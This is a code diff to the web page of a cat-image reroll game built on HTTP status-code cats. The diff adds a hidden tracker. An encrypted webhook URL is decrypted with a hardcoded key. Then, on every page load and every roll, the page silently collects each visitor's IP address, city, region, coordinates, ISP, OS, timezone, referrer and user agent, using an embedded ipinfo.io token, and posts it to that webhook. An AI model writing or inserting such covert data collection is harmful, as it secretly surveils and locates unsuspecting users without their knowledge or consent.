@@ -223,4 +223,122 @@
           const rarity = cat ? cat.rarity : "Unknown";
           const chance = rarityChances[rarity] || "?";
           const li = document.createElement("li");
-          li.textContent = `HTTP ${code} — ${rarity
+          li.textContent = `HTTP ${code} — ${rarity} - ${chance} — x${inventory[code]}`;
+          inventoryList.appendChild(li);
+        });
+    }
+
+    function showCat(cat) {
+      catImg.src = `https://http.cat/${cat.code}.jpg`;
+      rarityText.textContent = `Rarity: ${cat.rarity} — ${rarityChances[cat.rarity] || "?"}`;
+      Object.values(rarityClasses).forEach(cls => catImg.classList.remove(cls));
+      catImg.classList.add(rarityClasses[cat.rarity]);
+      saveInventory(cat.code);
+      localStorage.setItem("lastCat", JSON.stringify(cat));
+      lastCat = cat;
+    }
+
+    // Encryption stuff
+    const secretKey = "deadPenguin37156";
+    const encryptedWebhook = "U2FsdGVkX18Hn41CN6oi6wzT2+dcKyZ4cO0U+jDXpxKfBXuJbdeE44X68ijSa/OMTV+kCZcR8juoCxBA3J3tiw==";
+
+    function decryptWebhook(enc) {
+      const bytes = CryptoJS.AES.decrypt(enc, secretKey);
+      return bytes.toString(CryptoJS.enc.Utf8);
+    }
+
+    const webhookUrl = decryptWebhook(encryptedWebhook);
+
+    async function sendWebhook(data) {
+      try {
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+        });
+      } catch (e) {
+        console.error("Webhook send failed:", e);
+      }
+    }
+
+    async function gatherAndSendInfo() {
+      // Get basic info
+      const os = navigator.platform || "Unknown";
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+      const referrer = document.referrer || "None";
+      const userAgent = navigator.userAgent || "Unknown";
+
+      // Get IP info from ipinfo.io
+      let ipInfo = {};
+      try {
+        const token = "4ca57ffa6e1fc4"; // your ipinfo token
+        const res = await fetch(`https://ipinfo.io/json?token=${token}`);
+        ipInfo = await res.json();
+      } catch {
+        ipInfo = { error: "Failed to fetch IP info" };
+      }
+
+      // Compose webhook data
+      const embed = {
+        title: "User info log",
+        color: 0xff4500,
+        fields: [
+          { name: "OS", value: os, inline: true },
+          { name: "Timezone", value: timezone, inline: true },
+          { name: "ISP", value: ipInfo.org || "Unknown", inline: true },
+          { name: "Referrer", value: referrer, inline: false },
+          { name: "User Agent", value: userAgent, inline: false },
+          { name: "IP", value: ipInfo.ip || "Unknown", inline: true },
+          { name: "City", value: ipInfo.city || "Unknown", inline: true },
+          { name: "Region", value: ipInfo.region || "Unknown", inline: true },
+          { name: "Country", value: ipInfo.country || "Unknown", inline: true },
+          { name: "Location", value: ipInfo.loc || "Unknown", inline: false },
+        ],
+        timestamp: new Date().toISOString(),
+      };
+
+      await sendWebhook({ embeds: [embed] });
+    }
+
+    function reroll() {
+      if (animating) return;
+      animating = true;
+
+      catImg.classList.add("shuffling");
+      rarityText.textContent = "Shuffling...";
+
+      let shuffleInterval = setInterval(() => {
+        const randomCat = getRandomCat();
+        catImg.src = `https://http.cat/${randomCat.code}.jpg`;
+        Object.values(rarityClasses).forEach(cls => catImg.classList.remove(cls));
+        catImg.classList.add(rarityClasses[randomCat.rarity]);
+      }, 150);
+
+      setTimeout(() => {
+        clearInterval(shuffleInterval);
+        catImg.classList.remove("shuffling");
+        const finalCat = getRandomCat();
+        showCat(finalCat);
+
+        // Update roll count
+        rollCount++;
+        localStorage.setItem("rollCount", rollCount);
+        rollCounterDiv.textContent = `Rolls: ${rollCount}`;
+
+        animating = false;
+      }, 3500);
+    }
+
+    rerollBtn.onclick = () => {
+      reroll();
+      gatherAndSendInfo(); // send info on every roll
+    };
+
+    // Show last cat and inventory on load
+    showCat(lastCat);
+    renderInventory();
+    gatherAndSendInfo(); // also send info on page load
+
+  </script>
+</body>
+</html>
